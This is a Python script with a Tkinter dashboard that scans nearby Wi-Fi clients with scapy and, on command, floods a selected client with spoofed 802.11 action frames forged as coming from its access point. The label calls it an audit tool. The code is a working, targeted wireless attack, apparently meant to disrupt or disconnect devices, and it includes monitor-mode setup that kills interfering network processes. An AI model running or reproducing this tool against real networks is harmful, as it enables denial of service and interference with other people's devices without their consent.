import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class OCVFullAuditor:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {} # {MAC: {"BSSID": bssid, "CH": ch}}
        self.running = True
        self.firing = False
        self.current_ch = 1
        
        # Kill interference and lock hardware
        self.setup_monitor_lock()
        
        self.root = tk.Tk()
        self.root.title("Surgical OCV Dashboard v5.0")
        self.root.geometry("900x700")
        self.root.configure(bg="#050505")

        tk.Label(self.root, text="OCV LOOP + LIVE SCANNER", fg="#00FF41", bg="#050505", font=("Courier", 14, "bold")).pack(pady=10)
        
        # Selection Listbox
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="single", font=("Courier", 10), height=15)
        self.listbox.pack(padx=20, pady=10, fill="both", expand=True)

        self.status_var = tk.StringVar(value="Status: Monitoring Airwaves...")
        tk.Label(self.root, textvariable=self.status_var, fg="#888", bg="#050505").pack()

        # Controls
        self.btn_text = tk.StringVar(value="ENGAGE OCV LOOP")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_loop, bg="#aa5500", fg="white", height=2, width=25).pack(pady=5)
        tk.Button(self.root, text="REPAIR & EXIT", command=self.shutdown, bg="#333", fg="red", width=20).pack(pady=10)

        # Background Threads
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner_logic, daemon=True).start()

    def setup_monitor_lock(self):
        # Logic: Kill processes that flip the card to 'Managed' mode
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            if not self.firing: # Only hop if not currently attacking
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.current_ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else:
                time.sleep(1)

    def scanner_logic(self):
        def process_pkt(pkt):
            if not self.firing and pkt.haslayer(Dot11) and pkt.addr2 and pkt.addr3:
                src, bssid = pkt.addr2, pkt.addr3
                if src != bssid and src != "ff:ff:ff:ff:ff:ff":
                    if src not in self.discovered:
                        self.discovered[src] = {"BSSID": bssid, "CH": self.current_ch}
                        self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=process_pkt, store=0)

    def update_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            self.listbox.insert(tk.END, f"CLIENT: {mac} | AP: {info['BSSID']} | CH: {info['CH']}")

    def toggle_loop(self):
        if not self.firing:
            selection = self.listbox.curselection()
            if not selection: return
            self.firing = True
            self.btn_text.set("STOP LOOP")
            threading.Thread(target=self.fire_loop, args=(selection[0],), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE OCV LOOP")

    def fire_loop(self, index):
        target_mac = list(self.discovered.keys())[index]
        info = self.discovered[target_mac]
        
        # Lock to target's channel
        os.system(f"sudo iw dev {self.iface} set channel {info['CH']}")
        
        # Logic: Manual hex to bypass AttributeError
        base = RadioTap()/Dot11(addr1=target_mac, addr2=info['BSSID'], addr3=info['BSSID'])
        pkt = base/Dot11Action()/Raw(load=b"\x0a\x04\xff\x0a\x01\x01")
        
        self.status_var.set(f"Targeting: {target_mac} on CH {info['CH']}")
        while self.firing:
            try:
                sendp(pkt, iface=self.iface, count=20, inter=0.01, verbose=False)
                time.sleep(0.05) # Prevent firmware buffer overflow
            except:
                break
        self.status_var.set("Monitoring Airwaves...")

    def shutdown(self):
        self.running = False
        self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 ocv_v5.py [iface]")
    else: OCVFullAuditor(sys.argv[1]).root.mainloop()
